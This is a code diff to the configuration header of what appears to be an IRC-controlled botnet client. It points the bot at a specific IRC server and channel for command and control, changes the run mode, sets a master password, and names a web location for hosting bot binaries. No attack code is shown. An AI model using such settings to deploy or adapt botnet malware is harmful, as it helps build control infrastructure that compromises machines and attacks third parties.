@@ -2,15 +2,15 @@
 #define __CONFIG_H_
 
 /* BACKGROUND MODE '0', DEBUG MODE '1' (JUST FOR DEVELOPERS) */
-#define background_mode 0
+#define background_mode 1
 
 /* IRC SERVER SYNTAX: IP:PORT                            */
 /* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
 /* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
 /* HAVE AN MODDED PROTOCOL IRCD!!!                       */
-#define irc_servers  "127.0.0.1:6666|127.0.0.2:6667"
+#define irc_servers  "giggles.ny.chatfreedom.us:6667"
 #define passproto    "PASS"
-#define irc_passwd   "fuckya"
+#define irc_passwd   ""
 /* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
 /* USE HIDE.C TO CREATE YOUR CRYPTED SERVER LIST    */
 #define encirc 0
@@ -18,17 +18,18 @@
 #define enc_passwd  "bcdi"
 
 /* CHANNEL NAME */
-#define irc_chan      "#chan"
+#define irc_chan      "#tyerwtytrefwda"
 /* ENABLE FULL MESSAGES, '0'=OFF '1'=ON */
 /* NOTE: THAT PRODUCE MORE LAG!         */
 #define all_messages  0
 /* CHANNEL KEY */
-#define irc_chankey   "key"
+#define irc_chankey   ""
 
 /* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
-#define master_host     "@hostname.tld"
+/* #define master_host     "@147.32.83.232"*/
+#define master_host     ""
 /* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
-#define master_password "pwn"
+#define master_password "test1234"
 
 /* HTTP REFERENCE (WHERE YOU UPLOAD BINARIES AND GETBINARIES.SH) */
 #define reference_http  "http://127.0.0.1"
